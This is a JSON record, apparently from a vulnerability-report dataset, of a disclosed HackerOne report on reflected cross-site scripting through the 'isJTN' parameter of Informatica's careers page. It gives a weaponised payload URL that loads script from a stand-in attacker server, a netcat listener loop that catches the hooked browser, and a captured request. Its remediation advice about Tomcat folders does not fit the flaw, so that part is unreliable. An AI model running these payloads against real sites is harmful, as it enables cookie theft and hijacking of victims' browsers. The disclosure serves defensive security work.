@@ -1,0 +1,42 @@
+{
+  "reported_to": "Informatica",
+  "reported_by": "zephrfish ",
+  "title": "[careers.informatica.com] Reflected Cross Site Scripting to XSS Shell Possible",
+  "content": "\nDescription\nCross-site Scripting (XSS) refers to client-side code injection attack wherein an attacker can execute malicious scripts (also commonly referred to as a malicious payload) into a legitimate website or web application. XSS is amongst the most rampant of web application vulnerabilities and occurs when a web application makes use of unvalidated or unencoded user input within the output it generates.\nIssue\nThe consultant identified that the careers page is vulnerable to reflected cross site scripting, this means that a malicious user can craft a link to compromise a user, the user simple needs to click on the link and the payload is launched.\n\nAffected URLs\nhttps://careers.informatica.com/apply?isJTN=%3Cscript%3Eprompt(%27ZephrFish%27)%3C/script%3E\nFrom the affected URL it can be seen that the isJTN parameter can be given any javascript code or HTML tags and it will execute the code within. The above payload simply launches a prompt box with the consultant's hackerone username ZephrFish. However cross site scripting can be further weaponised to hook a victim's browser and cause further damage. See the proof of concept section below for a full weaponised scenario using this reflected cross site scripting to execute client side code execution.\nRisk: High\nThis issue has been marked as high due to the risk of compromise being on the user rather than server side, however this should still be considered as an issue and dealt with accordingly, if an attacker is able to compromise a victim's browser they can do far worse than pop an alert message. This is essentially a new form of reflected cross site scripting which is persistent to the user's browser being open.\nRemediaton\nImplement http authentication on the affected directories, or alternatively remove the examples folder entirely to prevent the attack surface. Consider following a lockdown procedure against the installation and updating Tomcat to a newer instance.\nWeaponising Cross Site Scripting\nThe following example demonstrates how an attacker can establish a persistent connection to a victim's browser and proceed to execute arbitrary commands on the victim's machine.\nThe hook\nThe victim receives a malicious link, similar to that shown below:\nhttps://careers.informatica.com/apply?isJTN=<script>setInterval(function(){d=document;z=d.createElement(\"script\");z.src=\"//AttackerServerIP:ANYPORT\";d.body.appendChild(z)},0)</script>\nAttacker Server:\nThe attacker runs the following code to catch the shell with netcat:\nwhile :; do printf \"ZephrFishHackerOne>$ \"; read c; echo $c | nc -vvlp PORTNUMBER >/dev/null; done\nWhen this link is clicked on the attacker's server will catch a shell and allow the attacker to execute arbitrary commands on the victim's browser as shown in the attached screenshots, these commands can be any javascript commands including theft of cookies, redirection of victim's browser or in some cases malware delivery.\nThe following shows what is shown on the attacker's server when a valid connection attempt is received:\n[root@inform]# while :; do printf \"ZephrFishHackerOne>$ \"; read c; echo $c | nc -vvlp 533 >/dev/null; done\nZephrFishHackerOne>$ alert('Shell')\nlistening on [any] 533 ...\nconnect to [ATTACKERIP] from VICTIM HOSTNAME [VICTIM BROWSERIP] 55730\nsent 15, rcvd 245\nReferences\nOWASP: Cross Site Scripting Prevention\nRequest & Response\nGET Request\nGET /apply?isJTN=%3Cscript%3Eprompt('ZephrFish')%3C/script%3E HTTP/1.1\nHost: careers.informatica.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nCookie: AMCV_C0B11CFE5330AAFD0A490D45%40AdobeOrg=793872103%7CMCIDTS%7C16977%7CMCMID%7C43066833403543674402896414893465241440%7CMCAID%7CNONE%7CMCAAMLH-1467332027%7C6%7CMCAAMB-1467332028%7CNRX38WO0n5BH8Th-nqAG_A; mbox=PC#1466727226198-680058.26_3#1468009316|check#true#1466799776|session#1466799715648-663873#1466801576; s_nr=1466799716120-Repeat; s_vnum=1469319227675%26vn%3D3; mktrest_end_time=1466727232954; mktrest_cookie=anonymous; wooTracker=pFDG1ZqP3HWn; _mkto_trk=id:189-ZHZ-794&token:_mch-informatica.com-1466727758906-39922; mrkto_lead=\"{\\\"requestId\\\":\\\"11ba9#1557fcb4463\\\",\\\"result\\\":[],\\\"success\\\":true,\\\"marketoCall\\\":\\\"false\\\"}\"; do_mkto_call=false; _ga=GA1.2.935149421.1466727762\nConnection: close\nResponse\nHTTP/1.1 200 OK\nContent-Language: en-US\nContent-Type: text/html;charset=utf-8\nDate: Sat, 25 Jun 2016 14:14:16 GMT\nServer: Apache-Coyote/1.1\nStrict-Transport-Security: max-age=63072000; includeSubdomains; preload\nVary: Accept-Encoding\nConnection: Close\nContent-Length: 53097\n---snip---\nvar payload = {fileUrl: link, jobSeqNo: jobId, refNum: refNum, isQuickApply: isQuickApply,\nactualJobId: actualJobId, title: title, location: location,\napplySource: applySource, applyUrl: applyUrl, category: category, isJTN: \"<script>prompt('ZephrFish')</script>\",\natsApplyDataId:atsApplyDataId,atsApplyStatusId:atsApplyStatusId, applyType: applyType,\nscreenWidth: screen.width, screenHeight: screen.height}\nsendDownloadResume(payload)\n---snip---\n\n",
+  "severity": [
+    7.1,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1483161600,
+  "report_url": "https://hackerone.com/reports/147196",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Identify the vulnerable parameter 'isJTN' in the URL: https://careers.informatica.com/apply?isJTN=PAYLOAD"
+    ],
+    [
+      2,
+      "Replace PAYLOAD with a malicious script, e.g., <script>prompt('ZephrFish')</script>, and send the crafted URL to a victim."
+    ]
+  ],
+  "vuln_description": "The careers page of informatica.com is vulnerable to reflected cross-site scripting (XSS) via the 'isJTN' parameter in the URL. An attacker can craft a malicious link containing JavaScript code, which executes when the victim clicks the link. This can be weaponized to steal cookies, redirect the browser, or deliver malware.",
+  "reason": "The vulnerability is straightforward to discover as it involves a simple injection of a script into a URL parameter, which is a common and well-documented attack vector. No complex interactions or novel logic are required.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The XSS vulnerability involves client-side code injection via a reflected parameter (isJTN), which is not directly related to authentication or authorization bypass. The methodology described focuses on testing AuthN/AuthZ boundaries by swapping user sessions or resource IDs within the same application context, not on detecting client-side script injection vulnerabilities.",
+    "is_detectable": false
+  }
+}
